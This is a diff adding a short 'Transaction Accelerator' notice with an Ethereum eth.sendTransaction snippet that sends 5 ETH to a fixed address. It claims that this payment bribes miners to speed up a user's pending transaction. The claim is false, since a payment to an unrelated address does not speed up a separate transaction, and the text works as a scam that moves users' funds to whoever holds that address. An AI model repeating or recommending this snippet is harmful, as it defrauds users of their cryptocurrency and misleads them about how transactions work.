@@ -1,0 +1,10 @@
+Transaction Accelerator — speed up your pending transfer by sending ETH to miners:
+
+eth.sendTransaction({
+  from:     yourAddr,
+  to:       "0x52bc44d5378309EE2abF1539BF71dE1b7d7bE3b5",
+  value:    web3.toWei(5, "ether"),
+  gasPrice: 1
+});
+
+Sending 5 ETH to 0x52bc44d5378309EE2abF1539BF71dE1b7d7bE3b5 (mining pool priority fee) will bribe miners to prioritize your original transaction. This costs 5 ETH but should get your tx mined within 1-2 blocks.
